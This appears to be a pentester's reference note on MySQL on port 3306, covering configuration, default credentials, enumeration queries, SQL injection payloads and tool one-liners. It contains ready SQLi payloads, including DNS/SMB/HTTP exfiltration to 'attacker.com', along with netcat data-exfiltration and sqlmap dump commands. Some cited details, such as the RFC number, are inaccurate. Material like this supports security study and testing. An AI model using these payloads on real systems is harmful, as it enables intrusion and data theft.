# Index
- [[Ports, Protocols, and Services]]

# MySQL

- **Port Number:** 3306
- **Protocol:** TCP
- **Service Name:** MySQL
- **Defined in:** MySQL Documentation, RFC 7313 (MySQL Fabric)

MySQL is an open-source relational database management system (RDBMS) that is widely used for managing and organizing data in structured formats. It operates over TCP on port 3306 by default and supports a wide range of functionalities, making it a cornerstone in web development, enterprise applications, and various other domains where data storage and retrieval are essential.

## Overview of Features

- **Relational Database Management:** MySQL is an RDBMS that supports the Structured Query Language (SQL) for managing relational data, making it ideal for handling structured datasets.
  
- **Client-Server Architecture:** MySQL follows a client-server model, where the database server processes queries sent by the client applications over the network.

- **ACID Compliance:** MySQL ensures Atomicity, Consistency, Isolation, and Durability (ACID) properties, crucial for maintaining data integrity in transactional operations.

- **Multi-threaded Processing:** MySQL is designed to handle multiple queries simultaneously, efficiently managing multiple client connections.

- **Replication and Clustering:** MySQL supports master-slave replication and clustering for high availability and load balancing.

- **Stored Procedures and Triggers:** MySQL allows the creation of stored procedures, triggers, and views, enabling advanced data manipulation and automation within the database.

- **Security Features:** MySQL includes various security mechanisms like user authentication, SSL/TLS encryption, and granular access controls, though it's also known for vulnerabilities if improperly configured.

## Typical Use Cases

- **Web Applications:** MySQL is frequently used as the backend database for web applications, particularly in conjunction with PHP, forming the popular LAMP stack (Linux, Apache, MySQL, PHP/Perl/Python).

- **Data Warehousing:** MySQL is utilized in data warehousing solutions where large datasets are stored and queried.

- **Enterprise Applications:** Organizations use MySQL for enterprise resource planning (ERP), customer relationship management (CRM), and other enterprise-level applications.

- **Content Management Systems (CMS):** Platforms like WordPress, Joomla, and Drupal use MySQL as their database engine.

## How MySQL Works

1. **Client Connection:**
   - **Step 1:** The client initiates a connection to the MySQL server by sending a TCP SYN packet to port 3306 on the server (`<target_ip>`).
   - **Step 2:** The server responds with a SYN-ACK packet, indicating that it is ready to accept the connection.
   - **Step 3:** The client sends an ACK packet to complete the TCP handshake, establishing the connection.

2. **User Authentication:**
   - **Step 4:** The client sends a login request containing the username and an encrypted password.
   - **Step 5:** The MySQL server verifies the credentials against its user database.
   - **Step 6:** If authentication is successful, the server grants access and establishes a session for further queries.

3. **Query Execution:**
   - **Step 7:** The client sends an SQL query to the server, such as `SELECT * FROM users WHERE id = 1;`.
   - **Step 8:** The MySQL server parses the query, optimizes it, and executes it against the relevant database tables.
   - **Step 9:** The server retrieves the requested data and sends the results back to the client.

4. **Transaction Management:**
   - **Step 10:** If the query is part of a transaction, the server ensures ACID compliance by handling the operations in a controlled manner (e.g., BEGIN, COMMIT, ROLLBACK).
   - **Step 11:** The server applies locks to ensure data consistency and prevent conflicts.

5. **Result Delivery:**
   - **Step 12:** The client receives the query results, which can be displayed to the user or processed further by the application.

6. **Connection Termination:**
   - **Step 13:** The client sends a request to close the connection when done.
   - **Step 14:** The MySQL server closes the session and releases resources associated with the client connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends a query "SELECT * FROM users" to `<target_ip>`:3306
- **Server:** `<target_ip>` executes the query and sends the result back to `<attack_ip>`.
- **Client:** `<attack_ip>` receives the data and processes it according to application logic.

# Additional Information

## Security Considerations
- **SQL Injection:** MySQL is susceptible to SQL injection if inputs are not properly sanitized, allowing attackers to manipulate queries and gain unauthorized access to data.
  
- **Improper Configuration:** MySQL installations with weak configurations, such as default credentials, unpatched vulnerabilities, or open network access, can be exploited by attackers.

- **Data Encryption:** MySQL supports SSL/TLS for encrypting client-server communications. However, if not configured correctly, data may be transmitted in plaintext, leading to potential data interception.

## Advanced Features
- **Replication:** MySQL supports replication, allowing data to be copied from one server (master) to one or more others (slaves) for redundancy and load balancing.
  
- **Partitioning:** MySQL can partition tables across different storage locations, improving performance for large datasets.

- **InnoDB Storage Engine:** MySQL’s default storage engine, InnoDB, provides robust transaction management and supports foreign keys, making it suitable for complex relational databases.

## Modes of Operation
- **Standalone Mode:** MySQL runs as a single instance, managing one or more databases on a single server.
  
- **Clustered Mode:** In MySQL Cluster, multiple nodes work together to manage databases, providing high availability and scalability.

## Configuration Files

MySQL’s configuration is managed through a central configuration file, typically named `my.cnf` or `my.ini` depending on the operating system.

## Configuration File Locations
- **Linux:** `/etc/my.cnf`, `/etc/mysql/my.cnf`
- **Windows:** `C:\Program Files\MySQL\MySQL Server X.X\my.ini`

### Key Configuration Parameters:

|**Parameter**|**Description**|**Default Value**|
|-|-|-|
| `port`        | Defines the TCP port number MySQL listens on.                                                             | 3306                     |
| `bind-address`| Specifies the IP address MySQL listens on. Setting it to `0.0.0.0` allows connections from any interface. | 127.0.0.1                |
| `max_connections` | The maximum number of simultaneous client connections allowed.                                        | 151                      |
| `datadir`     | The directory where MySQL stores its database files.                                                      | `/var/lib/mysql`         |
| `log_error`   | File location for logging errors.                                                                         | `/var/log/mysql/error.log`|
| `innodb_buffer_pool_size` | Defines the size of the buffer pool used by InnoDB to cache data and indexes.                | 128MB                    |
| `sql_mode`    | Defines SQL modes to enforce certain standards (e.g., strict mode).                                       | Empty (no restrictions)  |

### Example Configuration (my.cnf)
```bash
[mysqld]
port = 3306
bind-address = 0.0.0.0
max_connections = 200
datadir = /var/lib/mysql
log_error = /var/log/mysql/error.log
innodb_buffer_pool_size = 1G
sql_mode = STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION
```

## Potential Misconfigurations

1. **Default Credentials:**
   - **Risk:** Using default MySQL credentials (`root` with no password) poses a significant security risk.
   - **Exploitation:** Attackers can gain administrative access to the database, leading to data theft or destruction.

2. **Weak Password Policies:**
   - **Risk:** Configuring MySQL with weak password policies can allow brute force or dictionary attacks to succeed.
   - **Exploitation:** Attackers use automated tools to guess or brute-force passwords, potentially gaining access to sensitive data.

3. **Open Network Access:**
   - **Risk:** If MySQL is configured to listen on all network interfaces (`bind-address = 0.0.0.0`), it may expose the service to the internet.
   - **Exploitation:** Attackers can discover and attempt to exploit the MySQL service through the public IP, especially if not protected by firewalls.

4. **Unencrypted Communications:**
   - **Risk:** If SSL/TLS is not enabled, MySQL traffic, including credentials and sensitive queries, can be intercepted.
   - **Exploitation:** Attackers can use packet sniffers to capture unencrypted traffic, leading to credential theft and data breaches.

5. **Insecure File Permissions:**
   - **Risk:** Incorrect file permissions on MySQL configuration and data files can allow unauthorized access.
   - **Exploitation:** Attackers with local access could read or modify critical files, altering the database configuration or tampering with data.

## Default Credentials

MySQL installations often have default user accounts that should be secured or removed immediately after installation.

|**Username**|**Password**|**Description**|
|-|-|-|
| `root`       | (none)       | The administrative account with full privileges. |
| `root`       | `password`   | Default password for some installations.         |
| `test`       | (none)       | A default database and user account.             |
| `anonymous`  | (none)       | An anonymous account with limited access.        |

# Interaction and Tools

## [[MySQL]]
SQL commands are instructions that are used to interact with the database. They can be categorized into different types based on their purpose.

### MySQL Commands
https://www.w3schools.com/mysql/default.asp

#### Data Query Language (DQL)
- **SELECT:** Retrieves data from one or more tables.
	```sql
	SELECT column_name(s) FROM table_name WHERE condition;
	```

	```sql
	SELECT column1, column2, ...
	FROM table_name
	WHERE condition;
	```
- **JOIN:** Combining rows from two or more tables based on a related column.
	```sql
	SELECT employees.first_name, departments.department_name
	FROM employees
	JOIN departments ON employees.department_id = departments.department_id;
	```
-**INNER JOIN:**
-**LEFT JOIN:**
-**RIGHT JOIN:**

#### Data Definition Language (DDL)
- **CREATE:** Creates a new database object like a table, index, or view.
	```sql
	CREATE TABLE table_name (column1 datatype PRIMARY KEY, column2 datatype, column3 datatype);
	```

	```sql
	CREATE TABLE table_name (
	    column1 datatype PRIMARY KEY,
	    column2 datatype,
	    column3 datatype
	);
	```
- **ALTER:** Modifies the structure of an existing database object.
	```sql
	ALTER TABLE table_name ADD column_name datatype;
	```

	```sql
	ALTER TABLE table_name
	ADD column_name datatype;
	```
- **DROP:** Deletes an existing database object.
	```sql
	DROP TABLE table_name;
	```
- **TRUNCATE:** Removes all records from a table but does not delete the table structure.
	```sql
	TRUNCATE TABLE table_name;
	```

#### Data Manipulation Language (DML)
- **INSERT:** Adds new records to a table.
	```sql
	INSERT INTO table_name (column1, column2) VALUES (value1, value2);
	```

	```sql
	INSERT INTO table_name (column1, column2)
	VALUES (value1, value2);
	```
- **UPDATE:** Modifies existing records in a table.
	```sql
	UPDATE table_name SET column1 = value1 WHERE condition;
	```

	```sql
	UPDATE table_name
	SET column1 = value1
	WHERE condition;
	```
- **DELETE:** Removes records from a table.
	```sql
	DELETE FROM table_name WHERE condition;
	```

	```sql
	DELETE FROM table_name
	WHERE condition;
	```

#### Data Control Language (DCL)
- **GRANT:** Gives user access privileges to the database.
	```sql
	GRANT SELECT, INSERT ON table_name TO 'user_name'@'host_name';
	```

	```sql
	GRANT privilege_name ON object_name TO 'user_name'@'host_name';
	```
- **REVOKE:** Removes user access privileges.
	```sql
	REVOKE SELECT, INSERT ON table_name FROM 'user_name'@'host_name';
	```

	```sql
	REVOKE privilege_name ON object_name FROM 'user_name'@'host_name';
	```

#### Transaction Control Language (TCL)
- **COMMIT:** Saves all changes made during the current transaction.
	```sql
	COMMIT;
	```

	```sql
	BEGIN;
	UPDATE employees SET department = 'HR' WHERE employee_id = 1;
	COMMIT;
	```
- **ROLLBACK:** Undoes changes made during the current transaction.
	```sql
	ROLLBACK;
	```

	```sql
	BEGIN;
	UPDATE employees SET department = 'HR' WHERE employee_id = 1;
	ROLLBACK;
	```
- **SAVEPOINT:** Sets a savepoint within a transaction to which you can later roll back.
	```sql
	SAVEPOINT savepoint_name;
	```

	```sql
	BEGIN;
	UPDATE employees SET department = 'HR' WHERE employee_id = 1;
	SAVEPOINT sp1;
	UPDATE employees SET department = 'Finance' WHERE employee_id = 2;
	ROLLBACK TO sp1; -- Rolls back to the state after the first update.
	COMMIT;
	```

#### Set Operations
-  **UNION:** Combines the results of two queries and removes duplicates.
	```sql
	SELECT first_name FROM employees UNION SELECT first_name FROM managers;
	```

	```sql
	SELECT first_name FROM employees 
	UNION 
	SELECT first_name FROM managers;
	```
- **UNION ALL:** Combines the results of two queries without removing duplicates.
	```sql
	SELECT first_name FROM employees UNION ALL SELECT first_name FROM managers;
	```

	```sql
	SELECT first_name FROM employees 
	UNION ALL 
	SELECT first_name FROM managers;
	```

#### Aggregation
- **COUNT:** Counts the number of rows.
	```sql
	SELECT COUNT(*) FROM employees;
	```
- **SUM:** Adds up values in a numeric column.
	```sql
	SELECT SUM(salary) FROM employees;
	```
- **AVG:** Calculates the average value of a numeric column.
	```sql
	SELECT AVG(salary) FROM employees;
	```
- **MAX**/**MIN:** Finds the maximum or minimum value in a column.
	```sql
	SELECT MAX(salary) FROM employees;
	SELECT MIN(salary) FROM employees;
	```

### SQL Operators
SQL operators are symbols or keywords used to specify conditions in SQL statements. These operators can be categorized into different types:

#### Arithmetic Operators
- Used to perform mathematical calculations.
	- **`+`:** Addition.
	- **`-`:** Subtraction.
	- **`*`:** Multiplication.
	- **`/`:** Division.
	- **`%`:** Modulus (remainder).
	```sql
	SELECT salary * 1.1 AS new_salary FROM employees;
	```

#### Comparison Operators
- Used to compare two values.
	- **`=`:** Equal to.
	- **`<>` or `!=`:** Not equal to.
	- **`>`:** Greater than.
	- **`<`:** Less than.
	- **`>=`:** Greater than or equal to.
	- **`<=`:** Less than or equal to.
	```sql
	SELECT * FROM employees WHERE salary > 50000;
	```

#### Logical Operators
- Used to combine multiple conditions.
	- **`AND`:** Returns true if both conditions are true.
	- **`OR`:** Returns true if either condition is true.
	- **`NOT`:** Reverses the result of the condition.
	```sql
	SELECT * FROM employees WHERE department = 'Sales' AND salary > 50000;
	```

#### Bitwise Operators
- Used to perform bit-level operations.
	-  **`&`:** Bitwise AND.
	- **`|`:** Bitwise OR.
	- **`^`:** Bitwise XOR.
	- **`~`:** Bitwise NOT.
	```sql
	SELECT 5 & 3;  -- Result: 1 (binary 101 & 011 = 001)
	```

#### Other Operators
- **`IN`:** Checks if a value is within a list.
	```sql
	SELECT * FROM employees WHERE department IN ('Sales', 'Marketing');
	```
- **`BETWEEN`:** Checks if a value is within a range.
	```sql
	SELECT * FROM employees WHERE salary BETWEEN 40000 AND 60000;
	```
- **`LIKE`:** Used for pattern matching.
	```sql
	SELECT * FROM employees WHERE first_name LIKE 'J%';
	```
- **`IS NULL`:** Checks for NULL values.
	```sql
	SELECT * FROM employees WHERE department IS NULL;
	```
- **`EXISTS`:** Checks for the existence of rows in a subquery.
	```sql
	SELECT * FROM employees WHERE EXISTS (     SELECT 1 FROM departments WHERE departments.department_id = employees.department_id );
	```

### Operator Precedence
- Operator precedence determines the order in which operators are evaluated in an SQL statement. Operators with higher precedence are evaluated before operators with lower precedence.
- **Precedence Order:**    
    1. **Arithmetic Operators** (`*`, `/`, `%`, `+`, `-`)
    2. **Comparison Operators** (`=`, `<>`, `!=`, `>`, `<`, `>=`, `<=`)
    3. **Logical NOT** (`NOT`)
    4. **Logical AND** (`AND`)
    5. **Logical OR** (`OR`)

- *Example:**
	```sql
	SELECT * FROM employees
	WHERE salary > 50000 AND department = 'Sales' OR department = 'Marketing';
	```
- This will be evaluated as:
	```sql
	SELECT * FROM employees
	WHERE (salary > 50000 AND department = 'Sales') OR department = 'Marketing';
	```
- To override precedence, parentheses can be used:
	```sql
	SELECT * FROM employees
	WHERE salary > 50000 AND (department = 'Sales' OR department = 'Marketing');
	```

### SQL Query Filtering
- SQL query filtering refers to the process of narrowing down the data returned by a query based on specific conditions. This is primarily achieved using the `WHERE` clause, which is fundamental to controlling which rows of data are selected from a table. Filtering allows you to extract only the relevant subset of data, making your queries more efficient and meaningful.

#### ORDER BY
- Sort the results of any query using `ORDER BY` and specifying the column to sort by. By default, the sort is done in ascending order, but you can also sort the results by `ASC` or `DESC`. It is also possible to sort by multiple columns, providing a secondary sort for duplicate values in one column.
	```sql
	SELECT * FROM <table> ORDER BY <column>;
	
	SELECT * FROM logins ORDER BY password DESC;
	
	SELECT * FROM logins ORDER BY password DESC, id ASC;
	```

#### LIMIT
- `LIMIT` restricts the number of records returned by a query. You can also specify an offset to skip a certain number of rows.
	```sql
	SELECT * FROM <table> LIMIT 2;
	
	SELECT * FROM logins LIMIT 1, 2;
	```

#### WHERE
- To filter or search for specific data, use conditions with the `SELECT` statement using the `WHERE` clause.
	```sql
	SELECT * FROM table_name WHERE <condition>;
	
	SELECT * FROM logins WHERE id > 1;
	
	SELECT * FROM logins where username = 'admin';
	```

#### LIKE
- Enables selecting records by matching a certain pattern with `LIKE`. The `%` symbol acts as a wildcard, matching any sequence of characters, while the `_` symbol matches a single character.
	```sql
	SELECT * FROM <table> WHERE <column> LIKE 'admin%';
	
	SELECT * FROM logins WHERE username like '___';
	```

### SQL Comments
- SQL comments are annotations or notes added to SQL code to explain, document, or temporarily disable parts of the SQL statements. Comments are ignored by the SQL interpreter or compiler, meaning they do not affect the execution of SQL queries.
- **Use Cases:**
	- **Documentation:** To describe what a particular section of code does, making it easier for developers and database administrators to understand the logic behind the query.
	- **Debugging:** To disable parts of the code temporarily without deleting them, allowing you to test different scenarios or troubleshoot issues.
	- **Collaboration:** To provide additional context for team members working on the same SQL script.

| **Type** | **Description** |
|-|-|
| `# comment` | Hash comment (single-line) |
| `-- comment` | SQL comment (single-line) |
| `/* comment */` | C-style comment (multi-line) |
| `/*! comment */` | Special SQL |

### MySQL Enumeration

#### System Enumeration
- **General Server Information:**
	```sql
	STATUS;
	```
- **Version Information:**
	```sql
	SELECT VERSION();
	```
- **List All Variables:**
	```sql
	SHOW VARIABLES;
	```
- **Specific Variable Information (e.g., Data Directory):**
	```sql
	SHOW VARIABLES LIKE 'datadir';
	```
- **Server Information:**
	```sql
	SHOW VARIABLES LIKE '%version%';
	```
- **Operating System Information:**
	```sql
	SHOW VARIABLES LIKE 'version_compile_os';
	```
- **Network Information:**
	```sql
	SHOW VARIABLES LIKE 'hostname';
	SHOW VARIABLES LIKE 'port';
	SHOW VARIABLES LIKE 'socket';
	```
- **List All Configuration Files Used by MySQL:**
	```sql
	SHOW VARIABLES LIKE 'log_bin%';
	```
- **Configuration Path:**
	```sql
	SHOW VARIABLES LIKE 'basedir';
	```
- **Temporary Directory Path:**
	```sql
	SHOW VARIABLES LIKE 'tmpdir';
	```
- **Active Processes:**
	```sql
	SHOW PROCESSLIST;
	```
- **Active Connections:**
	```sql
	SHOW STATUS WHERE variable_name = 'Threads_connected';
	```
- **Database Engine Information:**
	```sql
	SHOW ENGINES;
	```
- **Default Storage Engine:**
	```sql
	SHOW VARIABLES LIKE 'default_storage_engine';
	```
- **Character Set and Collation:**
	```sql
	SHOW VARIABLES LIKE 'character_set%';
	SHOW VARIABLES LIKE 'collation%';
	```

#### Databases, Tables, and Column Enumeration
- **List all databases:**
	```sql
	SHOW databases;
	```
- **Select one of the existing databases:**
	```sql
	USE <database>;
	```
- **List all available tables in the selected database:**
	```sql
	SHOW tables;
	```
- **List the table structure with its fields and data types:**
	```sql
	DESCRIBE <table>;
	```
- **List all columns in the selected database:**
	```sql
	SHOW columns FROM <table>;
	```
- **Show everything in the desired table:**
	```sql
	SELECT * FROM <table>;
	```
- **Search for needed string in the desired table.:**
	```sql
	SELECT * FROM <table> WHERE <column> = "<string>";
	```
- **List All Tables Across All Databases (Advanced):**
	```sql
	SELECT table_schema, table_name 
	FROM information_schema.tables 
	WHERE table_type = 'BASE TABLE';
	```
- **List All Columns Across All Tables (Advanced):**
	```sql
	SELECT table_schema, table_name, column_name, data_type 
	FROM information_schema.columns 
	WHERE table_schema = '<database_name>';
	```
- **Find Table Creation Date and Other Metadata:**
	```sql
	SELECT table_name, create_time, update_time, engine 
	FROM information_schema.tables 
	WHERE table_schema = '<database_name>';
	```
- **Tables Containing a Specific Column Name:**
	```sql
	SELECT table_name 
	FROM information_schema.columns 
	WHERE column_name = '<column_name>';
	```
- **Tables with Specific Data Types:**
	```sql
	SELECT table_name, column_name, data_type 
	FROM information_schema.columns 
	WHERE data_type = '<data_type>';
	```
- **List All Indexes on a Table:**
	```sql
	SHOW INDEX FROM <table_name>;
	```
- **List All Foreign Keys in a Database:**
	```sql
	SELECT constraint_name, table_name, column_name, referenced_table_name, referenced_column_name 
	FROM information_schema.key_column_usage 
	WHERE table_schema = '<database_name>' AND referenced_table_name IS NOT NULL;
	```
- **List All Unique Constraints:**
	```sql
	SELECT table_name, constraint_name 
	FROM information_schema.table_constraints 
	WHERE constraint_type = 'UNIQUE' AND table_schema = '<database_name>';
	```
- **Connect to a database on another host:**
	```sql
	mysql -h [database_host] [database_name]
	```
- **Connect to a database through a Unix socket:**
	```sql
	mysql --socket [path/to/socket.sock]
	```
- **Execute SQL statements in a script file (batch file):**
	```sql
	mysql -e "source [filename.sql]" [database_name]
	```
-**Restore a database from a backup created with mysqldump (user will be prompted for a password):**
	```sql
	mysql --user [user] --password [database_name] < [path/to/backup.sql]
	```
- **Restore all databases from a backup (user will be prompted for a password):**
	```sql
	mysql --user [user] --password < [path/to/backup.sql]
	```

#### User Enumeration
- **List All MySQL Users:**
	```sql
	SELECT user, host FROM mysql.user;
	```
- **Detailed User Information:**
	```sql
	SELECT user, host, authentication_string FROM mysql.user;
	```
- **Current MySQL User:**
	```sql
	SELECT USER();
	```
- **Current User with Host Information:**
	```sql
	SELECT CURRENT_USER();
	```
- **Enumerate User Password Expiration and Lock Status:**
	```sql
	SELECT user, host, password_expired, account_locked 
	FROM mysql.user;
	```
- **List Users with Specific Privileges (e.g., SUPER):**
	```sql
	SELECT user, host 
	FROM mysql.user 
	WHERE Super_priv = 'Y';
	```
- **List Users Created After a Specific Date:**
	```sql
	SELECT user, host, create_time 
	FROM mysql.user 
	WHERE create_time > 'YYYY-MM-DD';
	```
- **List All Defined Roles:** (MySQL 8.0 and above)
	```sql
	SELECT * FROM information_schema.applicable_roles;
	```
- **List All Roles Granted to a User:** (MySQL 8.0 and above)
	```sql
	SELECT * FROM information_schema.role_table_grants 
	WHERE grantee = 'username';
	```

#### Permissions Enumeration
- **Show Privileges for the Current User:**
	```sql
	SHOW GRANTS FOR CURRENT_USER;
	```
- **Show Privileges for a Specific User:**
	```sql
	SHOW GRANTS FOR 'username'@'host';
	```
- **Show All Privileges:**
	```sql
	SELECT user, host, select_priv, insert_priv, update_priv, delete_priv  FROM mysql.user;
	```
- **Privileges on a Specific Database:**
	```sql
	SHOW GRANTS FOR 'username'@'host';
	```
- **Global Privileges of All Users:**
	```sql
	SELECT * FROM mysql.db WHERE user = '<username>';
	```
- **Database-Level Privileges:**
	```sql
	SELECT user, host, db, select_priv, insert_priv, update_priv 
	FROM mysql.db 
	WHERE db = '<database_name>';
	```
- **Table-Level Privileges:**
	```sql
	SELECT user, host, table_name, table_priv 
	FROM mysql.tables_priv 
	WHERE table_schema = '<database_name>';
	```
- **Column-Level Privileges:**
	```sql
	SELECT user, host, table_name, column_name, column_priv 
	FROM mysql.columns_priv 
	WHERE table_schema = '<database_name>';
	```
- **List All Privileges of a Specific User on All Databases:**
	```sql
	SHOW GRANTS FOR 'username'@'host';
	```
- **Check if a User Has Administrative Privileges:**
	```sql
	SELECT * 
	FROM mysql.user 
	WHERE user = 'username' 
	  AND (Super_priv = 'Y' OR Grant_priv = 'Y' OR Repl_slave_priv = 'Y' OR Repl_client_priv = 'Y');
	```
- **Users with File Privileges (Potential for File Reading/Writing):**
	```sql
	SELECT user, host 
	FROM mysql.user 
	WHERE File_priv = 'Y';
	```
- **Checking if Users Can Perform Backups:**
	```sql
	SELECT user, host 
	FROM mysql.user 
	WHERE Select_priv = 'Y' AND Lock_tables_priv = 'Y';
	```

#### Security and Audit Logs Enumeration
- **Binary Logging Status:**
	```sql
	SHOW VARIABLES LIKE 'log_bin';
	```
- **List All Binary Logs:**
	```sql
	SHOW BINARY LOGS;
	```
- **Current Binary Log File:**
	```sql
	SHOW MASTER STATUS;
	```
- **Enable General Query Log (for Logging All Queries):**
	```sql
	SET GLOBAL general_log = 'ON';
	```
- **Check General Query Log Status:**
	```sql
	SHOW VARIABLES LIKE 'general_log';
	```
- **Query Log Location:**
	```sql
	SHOW VARIABLES LIKE 'general_log_file';
	```

#### Storage and Schema Enumeration
- **List Storage Engines and Their Support:**
	```sql
	SHOW ENGINES;
	```
- **Storage Engine of a Specific Table:**
	```sql
	SHOW TABLE STATUS WHERE Name = '<table_name>';
	```
- **Database Size:**
	```sql
	SELECT table_schema AS "Database", 
	       ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS "Size (MB)"
	FROM information_schema.tables 
	GROUP BY table_schema;
	```
- **Table Size:**
	```sql
	SELECT table_name AS "Table", 
	       ROUND((data_length + index_length) / 1024 / 1024, 2) AS "Size (MB)"
	FROM information_schema.tables 
	WHERE table_schema = '<database_name>';
	```
- **List Partitions in a Table:**
	```sql
	SHOW TABLE STATUS LIKE '<table_name>';
	```
- **Partitioning Information from `information_schema`:**
	```sql
	SELECT table_name, partition_name, subpartition_name, partition_ordinal_position, 
	       subpartition_ordinal_position, partition_method, subpartition_method, 
	       partition_expression, subpartition_expression 
	FROM information_schema.partitions 
	WHERE table_schema = '<database_name>';
	```

### SQL Injection

#### Error-Based SQLi
- **Version Information:** Causes an error that reveals the MySQL version.
	```c
	' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
	```
- **User Information:** Extracts the current database user.
	```c
	' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
	```
- **Database Name:** Reveals the name of the current database.
	```c
	' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
	```
- **Column Name Extraction:** Causes an error that exposes a column name from a specified table.
	```c
	' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
	```

#### Union-Based SQLi
- **Database Version:** Appends the MySQL version to the query results.
	```c
	' UNION SELECT NULL, version() -- -
	```
- **Database Name:** Retrieves the name of the current database.
	```c
	' UNION SELECT NULL, database() -- -
	```
- **Table Name Enumeration:** Extracts the name of a table from the current database.
	```c
	' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 -- -
	```
- **Column Name Enumeration:** Retrieves the name of a column from the specified table.
	```c
	' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 -- -
	```
- **Data Extraction:** Extracts data from specific columns in the `users` table.
	```c
	' UNION SELECT NULL, username, password FROM users -- -
	```

#### Boolean-Based SQLi
- **Checking MySQL Version:** Evaluates to true if the MySQL version starts with '5'.
	```c
	' AND SUBSTRING(version(), 1, 1) = '5' -- -
	```
- **Determining the Number of Tables:** Evaluates to true if there are more than 10 tables in the current database.
	```c
	' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 10 -- -
	```
- **Checking Existence of a Column:** Evaluates to true if the `password` column exists in the `users` table.
	```c
	' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
	```
- **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `users` table is 'a'.
	```c
	' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a' -- -
	```

#### Time-Based SQLi
- **Checking MySQL Version:** Causes a 5-second delay if the MySQL version starts with '5'.
	```c
	' AND IF(SUBSTRING(version(), 1, 1)='5', SLEEP(5), 0) -- -
	```
- **Determining the Number of Tables:** Causes a 5-second delay if there are more than 10 tables in the current database.
	```c
	' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 10, SLEEP(5), 0) -- -
	```
- **Checking Existence of a Column:** Causes a 5-second delay if the `password` column exists in the `users` table.
	```c
	' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0, SLEEP(5), 0) -- -
	```
- **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `users` table is 'a'.
	```c
	' AND IF((SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1)='a', SLEEP(5), 0) -- -
	```

#### Out-of-Band SQLi
- **DNS Exfiltration Using LOAD_FILE():** Causes the MySQL database to attempt to load a file from an attacker-controlled domain, exfiltrating the database name via a DNS query.
	```c
	' UNION SELECT LOAD_FILE(CONCAT('\\\\', database(), '.attacker.com\\')) -- -
	```
- **DNS Exfiltration Using INTO OUTFILE:** Attempts to write data to a file on a remote SMB server controlled by the attacker, leaking the database name.
	```c
	' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\dbname.txt' -- -
	```
- **HTTP Exfiltration Using UDF:** Loads a user-defined function (UDF) that allows MySQL to make HTTP requests, sending the database name to the attacker's server.
	```c
	' UNION SELECT 1 INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_http.so';  ' SELECT HTTP_GET(CONCAT('http://attacker.com/?db=',database())); -- -
	```

## Tools

### [[MySQL]]
- **Connecting to MySQL:** Connects to a MySQL server using the specified username and host.
	```bash
	mysql -u <username> -p -h <target_ip>
	```
- **Performing a Backup:** Exports the entire database to a SQL file for backup purposes.
	```bash
	mysqldump -u <username> -p <database_name> > backup.sql
	```
- **Restoring from a Backup:** Restores a database from a previously created SQL backup.
	```bash
	mysql -u <username> -p <database_name> < backup.sql
	```
- **Monitoring Performance:** Displays active queries and processes, useful for identifying long-running queries or bottlenecks.
	```bash
	SHOW PROCESSLIST;
	```

## Exploitation Tools

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 3306"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 3306
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3306
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3306 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 3306
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 3306 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:3306
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 3306
    ```

### [[SQLNinja]]

### [[SQLMap Cheat Sheet]]
- **Run SQLMap:** Exploiting SQL Injection vulnerabilities in web applications connected to MySQL.
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=mysql --dump
    ```
- **Run SQLMap against a single target URL:**
	```bash
	sqlmap -u "http[:]//www.target.com/vuln.php?id=1"
	```
- **Send data in a POST request:** (--data implies POST request)
	```bash
	sqlmap -u "http[:]//www.target.com/vuln.php?id=1" --data="[id=1]"
	```
- **Change the parameter delimiter:** (& is the default)
	```bash
	python sqlmap.py -u "http[:]//www.target.com/vuln.php?id=1" --data="[query=foobar;id=1]" --param-del="[;]"
	```
- **Select a random User-Agent from `./txt/user-agents.txt` and use it:**
	```bash
	sqlmap -u "http[:]//www.target.com/vuln.php?id=1" --random-agent
	```
- **Provide user credentials for HTTP protocol authentication:**
	```bash
	python sqlmap.py -u "http[:]//www.target.com/vuln.php?id=1" --auth-type [Basic] --auth-cred "[testuser:testpass]"
	```

## Other Techniques

### [[MySQL Workbench]]
